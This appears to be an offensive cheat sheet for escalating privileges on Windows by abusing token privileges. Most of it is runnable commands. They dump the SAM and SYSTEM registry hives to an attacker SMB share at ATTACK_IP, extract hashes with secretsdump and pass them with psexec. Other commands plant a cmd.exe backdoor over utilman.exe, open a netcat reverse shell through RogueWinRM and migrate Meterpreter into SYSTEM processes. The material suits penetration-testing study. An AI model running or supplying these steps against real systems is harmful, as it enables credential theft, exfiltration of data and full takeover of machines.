# Privilege check command: whoami /priv

# Examples of dangerous privileges:

## SeBackup/SeRestore

#### 1: Backup SAM and SYSTEM hashes

#### req save hklm\system c:\users\user\system.hive

#### req save hklm\sam c:\users\user\sam.hive

#### 2: Create SMB Server on attacking machine

#### 1: mkdir share

#### 2: python3 impacket-smbserver.py -smb2support -username USER -password PASSWORD public share

#### 3: Copy backups to share folder

#### copy c:\users\user\sam.hive \\ATTACK_IP\public\

#### copy c:\users\user\system.hive \\ATTACK_IP\public\

#### 4: Retrieve hashes

#### python3 impacket-secretsdump.py -sam sam.hive -system system.hive LOCAL

#### 5: Pass-The-Hash Attack (PtH)

#### python3 impacket-psexec.py -hashes HASH administrator@TARGET_IP

#### TIP: We can also use evil-winrm for PtH attacks.

## Alternate Method to transfer the Hives: reg.py  remotely on Linux

 - python smbserver.py -smb2support share /tmp

 - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SAM' -o '\\attacker ip\share'

 - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SYSTEM' -o '\\attacker ip\share'

 - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SECURITY' -o '\\attacker ip\share'

## Alternate Method: SeBackupPrivilegeUtils https://github.com/giuliano108/SeBackupPrivilege

### Usage:

 - Import-Module .\SeBackupPrivilegeUtils.dll

 - Import-Module .\SeBackupPrivilegeCmdLets.dll

 - Set-SeBackupPrivilege

 - Get-SeBackupPrivilege

## Alternate Method: Robocopy

 - robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B

 - type C:\Users\Public\root.txt

## SeTakeOwnership

#### Essentially, we can take ownership of a service running as SYSTEM and elevate privileges.

### Example: Utilman.exe

#### 1: takeown /f c:\windows\system32\utilman.exe

#### 2: icacls c:\windows\system32\utilman.exe /grant USER:F

#### 3: copy cmd.exe utilman.exe

#### 4: Trigger uitlman : Lock screen, click ease of access

## SeImpersonate/SeAssignPrimaryToken

### A lot of potato exploits work with these privileges, so in our example we will talk about RoguePotato.

#### RogueWinRM.exe exploit

#### 1: Start listener

#### c:\path\to\roguewinrm\roguewinrm.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe ATTACK_IP PORT"

## Tool: PrintSpoofer

## Link: https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

## SeDebug Privilege

### Tools: Meterpreter, https://github.com/decoder-it/psgetsystem

### Steps:

#### 1) Get-Process winlogon (Check for a specific SYSTEM level process running on the machine)

#### 2) Download and execute Meterpreter on target machine to connect to us

#### 3) ps (Check for processes running as SYSTEM. Example: winlogon.exe)

#### 4) migrate PID (Take ownership of the elevated process)

#### 5) VOILA!

## TIP: If the SeDebug Privilege is disabled, we can enable it with psgetsystem powershell script (Link attached at the top of this attack's explanation)
